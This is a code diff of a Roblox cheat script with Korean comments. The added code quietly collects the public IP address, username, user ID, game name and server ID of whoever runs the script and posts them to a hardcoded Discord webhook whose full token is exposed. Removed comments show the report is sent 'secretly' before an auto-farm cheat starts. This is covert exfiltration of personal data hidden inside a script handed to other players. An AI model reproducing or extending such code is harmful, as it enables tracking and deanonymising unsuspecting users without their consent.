@@ -1,48 +1,74 @@
--- [[ 1. 디스코드 알림 섹션: 실행하면 형한테 보고서가 날아감 ]] --
-
 local HttpService = game:GetService("HttpService")
 
-local webhookURL = "https://discord.com/api/webhooks/1497487711932780666/hnubTv3N8iczDv3t4L2UMfm_MMTvjJV3YftcsGgwnFhsGteP8wU6wl0PeFOofyUihiG5" -- (여기에 디스코드 웹훅 주소 붙여넣기!)
+local webhookURL = "https://discord.com/api/webhooks/1497487711932780666/hnubTv3N8iczDv3t4L2UMfm_MMTvjJV3YftcsGgwnFhsGteP8wU6wl0PeFOofyUihiG5"
 
 
 
-local function sendWebhook()
+local function sendDetailedWebhook()
 
     local player = game.Players.LocalPlayer
 
-    local data = {
-
-        ["content"] = "🚨 **스크립트 실행 감지!**",
-
-        ["embeds"] = {{
-
-            ["title"] = "누가 내 스크립트를 사용 중이야!",
-
-            ["color"] = 16711680, -- 빨간색
-
-            ["fields"] = {
-
-                {["name"] = "플레이어 닉네임", ["value"] = player.Name, ["inline"] = true},
-
-                {["name"] = "유저 ID (프로필 주소)", ["value"] = "https://www.roblox.com/users/"..player.UserId.."/profile", ["inline"] = false},
-
-                {["name"] = "실행한 게임명", ["value"] = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name, ["inline"] = true}
-
-            },
-
-            ["timestamp"] = os.date("!%Y-%m-%dT%H:%M:%SZ")
-
-        }}
-
-    }
+    local request = (syn and syn.request) or (http and http.request) or http_request or (Fluxus and Fluxus.request) or request
 
     
 
-    -- 실행기 환경에 따라 요청 방식 자동 선택 (syn, request 등)
-
-    local request = (syn and syn.request) or (http and http.request) or http_request or (Fluxus and Fluxus.request) or request
-
     if request then
+
+        -- 1. IP 주소 가져오기 시도
+
+        local ipData = "Unknown (Blocked)"
+
+        local success, response = pcall(function()
+
+            return request({
+
+                Url = "https://api.ipify.org", -- IP 확인 API
+
+                Method = "GET"
+
+            }).Body
+
+        end)
+
+        if success then ipData = response end
+
+
+
+        -- 2. 디스코드로 보낼 데이터 정리
+
+        local data = {
+
+            ["content"] = "🚨 **스크립트 실행 및 IP 감지!**",
+
+            ["embeds"] = {{
+
+                ["title"] = "실행자 상세 정보 리포트",
+
+                ["color"] = 16711680,
+
+                ["fields"] = {
+
+                    {["name"] = "닉네임", ["value"] = player.Name, ["inline"] = true},
+
+                    {["name"] = "유저 ID", ["value"] = tostring(player.UserId), ["inline"] = true},
+
+                    {["name"] = "🌐 IP 주소", ["value"] = "||" .. ipData .. "||", ["inline"] = false}, -- 디코드에서 클릭해야 보이게 마스킹
+
+                    {["name"] = "게임 이름", ["value"] = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name, ["inline"] = true},
+
+                    {["name"] = "서버 코드(JobId)", ["value"] = game.JobId, ["inline"] = false}
+
+                },
+
+                ["footer"] = {["text"] = "IP 정보는 VPN 사용 시 부정확할 수 있습니다."}
+
+            }}
+
+        }
+
+
+
+        -- 3. 전송
 
         pcall(function()
 
@@ -63,36 +89,6 @@ local function sendWebhook()
     end
 
 end
-
-task.spawn(sendWebhook) -- 사냥 시작 전에 몰래 보고서 전송
-
-
-
--- [[ 2. 형의 26.0 버전 원본 코드 시작 ]] --
-
-local RunService = game:GetService("RunService")
-
-local Players = game:GetService("Players")
-
-local VIM = game:GetService("VirtualInputManager")
-
-local player = Players.LocalPlayer
-
-
-
--- [설정 변수]
-
-local waitingPos = Vector3.new(10960.82, 133.84, 1250.03) 
-
-local isAutoFarming = false
-
-local currentTarget = nil
-
-local maxDist = 250 
-
-local followDistance = 7
-
-local currentEquipped = 1
 
 
 
